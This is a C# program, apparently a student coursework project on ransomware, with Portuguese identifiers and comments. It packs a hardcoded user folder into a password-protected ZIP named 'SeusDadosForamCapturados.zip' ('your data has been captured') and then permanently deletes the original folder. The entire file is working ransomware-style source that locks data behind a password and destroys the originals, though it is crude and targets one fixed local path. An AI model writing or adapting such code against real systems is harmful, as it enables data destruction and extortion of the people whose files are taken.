using System;
using System.IO;
using ICSharpCode.SharpZipLib.Zip;

class Program
{
    static void Main(string[] args)
    {
        try
        {
            string pastaOrigem = "C:\\Users\\paulo\\Desktop\\POO-TrabalhoRamsonware";
            string arquivoDestino = "C:\\Users\\paulo\\Desktop\\SeusDadosForamCapturados.zip";
            string senha = "senhabemmassa";

            if (!Directory.Exists(pastaOrigem))
            {
                Console.WriteLine("A pasta informada não existe.");
                return;
            }

            // Compactar a pasta
            CompactarPastaComSenha(pastaOrigem, arquivoDestino, senha);

            // Verifica se o arquivo ZIP foi criado com sucesso
            if (File.Exists(arquivoDestino))
            {
                // Apagar a pasta original permanentemente
                ApagarPastaPermanentemente(pastaOrigem);
            }
            else
            {
                Console.WriteLine("O arquivo ZIP não foi criado corretamente. A pasta não será apagada.");
            }
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine($"Erro durante o processo: {ex}");
        }
    }

    static void CompactarPastaComSenha(string pastaOrigem, string arquivoDestino, string senha)
    {
        try
        {
            // Cria o arquivo ZIP
            using (FileStream fs = File.Create(arquivoDestino))
            using (ZipOutputStream zipStream = new ZipOutputStream(fs))
            {
                zipStream.SetLevel(9); // Define o nível de compressão (0-9)
                zipStream.Password = senha; // Define a senha

                // Adiciona os arquivos da pasta ao ZIP
                AdicionarPastaAoZip(zipStream, pastaOrigem, "");

                zipStream.Finish();
            }

            Console.WriteLine($"Pasta compactada com sucesso em {arquivoDestino}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro ao compactar a pasta: {ex.Message}");
            throw;
        }
    }

    static void AdicionarPastaAoZip(ZipOutputStream zipStream, string pastaOrigem, string pastaRelativa)
    {
        // Adicionar todos os arquivos da pasta ao ZIP
        foreach (var arquivo in Directory.GetFiles(pastaOrigem))
        {
            var entryName = Path.Combine(pastaRelativa, Path.GetFileName(arquivo));
            var newEntry = new ZipEntry(entryName)
            {
                DateTime = DateTime.Now
            };

            zipStream.PutNextEntry(newEntry);

            // Escrever o conteúdo do arquivo no ZIP
            using (var fs = File.OpenRead(arquivo))
            {
                fs.CopyTo(zipStream);
            }

            zipStream.CloseEntry();
        }

        // Recursivamente adicionar subpastas
        foreach (var subPasta in Directory.GetDirectories(pastaOrigem))
        {
            var pastaNome = Path.Combine(pastaRelativa, Path.GetFileName(subPasta));
            AdicionarPastaAoZip(zipStream, subPasta, pastaNome);
        }
    }

    static void ApagarPastaPermanentemente(string pastaOrigem)
    {
        try
        {
            // Apaga a pasta de forma permanente
            Directory.Delete(pastaOrigem, true); // O segundo parâmetro 'true' indica que deve apagar subdiretórios e arquivos
            Console.WriteLine("Pasta original apagada permanentemente.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro ao apagar a pasta: {ex.Message}");
            throw;
        }
    }
}
